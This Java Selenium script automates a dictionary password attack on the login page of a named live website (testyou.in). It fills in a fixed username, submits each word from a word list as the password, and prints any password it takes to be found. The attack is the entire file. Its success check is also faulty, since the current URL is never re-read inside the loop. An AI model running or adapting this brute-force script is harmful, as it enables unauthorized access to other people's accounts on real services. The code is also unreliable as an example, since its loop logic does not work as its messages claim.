import dev.failsafe.internal.util.Assert;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.interactions.Action;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.ExpectedCondition;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.IOException;
import java.time.Duration;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;


public class Main {
    public static void main(String args[]) throws IOException, InterruptedException {
        ArrayList words = new ArrayList<String>();
        String link = "http://www.testyou.in/Login.aspx";
        int count =0;

        try{

            Read dictionary = new Read(words);

        }catch (IOException e){
            e.printStackTrace();
        }
        System.setProperty("webdriver.edge.driver","C://Users//amunye//IdeaProjects//Drivers/msedgedriver.exe");
        WebDriver driver = new EdgeDriver();
        Thread.sleep(1500);
        driver.manage().window().maximize();
        Thread.sleep(3000);
        driver.get("https://duckduckgo.com");


        WebElement inputBar =driver.findElement(By.xpath("/html/body/div/div[2]/div/div[1]/div[2]/form/input[1]"));
        WebElement search = driver.findElement(By.xpath("//*[@id=\"search_button_homepage\"]"));

        inputBar.sendKeys("Testyou login");
        Thread.sleep(1500);
        search.click();
        Thread.sleep(1500);
        driver.findElement(By.xpath("//*[@id=\"r1-0\"]/div[2]/h2/a/span")).click();
        Thread.sleep(1000);

        driver.findElement(By.xpath("//*[@id=\"ctl00_CPHContainer_txtUserLogin\"]")).sendKeys("demo4class");

        Thread.sleep(1000);

       String currentURL = driver.getCurrentUrl();




        //WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));
       while (link.equals(currentURL) ){


           String pass = String.valueOf(words.get(count));
           System.out.println(pass);
           driver.findElement(By.id("ctl00_CPHContainer_txtPassword")).sendKeys((pass));

           driver.findElement(By.xpath("//*[@id=\"ctl00_CPHContainer_btnLoginn\"]")).click();
           System.out.println("This is  " + !currentURL.equals(link));
            if(!currentURL.equals(link)){
                System.out.println("This is the password that was found" + pass);
                Thread.sleep(10000);
                driver.quit();
            }
            count++;


        }






    }
}


